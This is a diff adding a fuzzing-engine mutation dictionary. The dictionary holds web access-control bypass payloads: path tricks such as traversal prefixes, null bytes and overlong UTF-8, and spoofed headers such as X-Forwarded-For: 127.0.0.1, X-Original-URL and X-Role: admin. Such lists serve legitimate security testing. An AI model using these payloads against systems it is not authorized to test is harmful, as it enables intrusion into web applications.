@@ -1,0 +1,89 @@
+# fuzz-mutations.txt — fuzz-engine 默认变异策略字典
+# 每行一个策略模板;支持 #tag 标记,供 fuzz-engine 按 mode 选择
+# 占位符说明:
+#   __PATH__    被替换为原始路径(如 /api/user)
+#   __PARAM__   被替换为参数名
+#   __VALUE__   被替换为参数值/payload
+#   __URL__     被替换为完整 URL
+
+# ── path 模式变异 ─────────────────────────────────────
+#path raw
+__PATH__
+#path trailing-slash
+__PATH__/
+#path double-slash
+__PATH__//
+#path semicolon-param
+__PATH__;jsessionid=test
+#path case-flip
+__PATH__.TXT
+#path json-suffix
+__PATH__.json
+#path xml-suffix
+__PATH__.xml
+#path action-suffix
+__PATH__?action=edit
+#path debug-query
+__PATH__?debug=1
+#path method-override-get
+__PATH__
+#path method-override-post
+__PATH__
+#path x-original-url
+__PATH__
+#path path-traversal-prefix
+/../__PATH__
+#path url-encoded-dot
+__PATH__%00
+#path unicode-normalization
+__PATH__%c0%af
+
+# ── param 模式变异(payload 由 ssrf-payloads.txt / sqli / cmd 组合生成) ──
+#param value-as-is
+__VALUE__
+
+# ── header 模式绕过 ─────────────────────────────────────
+#header x-forwarded-for
+X-Forwarded-For: 127.0.0.1
+#header x-forwarded-host
+X-Forwarded-Host: localhost
+#header x-original-url
+X-Original-URL: __PATH__
+#header x-rewrite-url
+X-Rewrite-URL: __PATH__
+#header x-http-method-override
+X-HTTP-Method-Override: GET
+#header x-http-method
+X-HTTP-Method: GET
+#header x-method-override
+X-Method-Override: GET
+#header x-custom-ip-authorization
+X-Custom-IP-Authorization: 127.0.0.1
+#header x-real-ip
+X-Real-IP: 127.0.0.1
+#header x-remote-ip
+X-Remote-IP: 127.0.0.1
+#header x-originating-ip
+X-Originating-IP: 127.0.0.1
+#header x-remote-addr
+X-Remote-Addr: 127.0.0.1
+#header client-ip
+Client-IP: 127.0.0.1
+#header true-client-ip
+True-Client-IP: 127.0.0.1
+#header x-api-key-empty
+X-Api-Key:
+#header x-admin
+X-Admin: 1
+#header x-role-admin
+X-Role: admin
+#header referer-localhost
+Referer: http://localhost/__PATH__
+
+# ── body 模式 Content-Type 切换 ────────────────────────
+#body json-as-form
+application/x-www-form-urlencoded
+#body json-as-xml
+text/xml
+#body json-as-plain
+text/plain
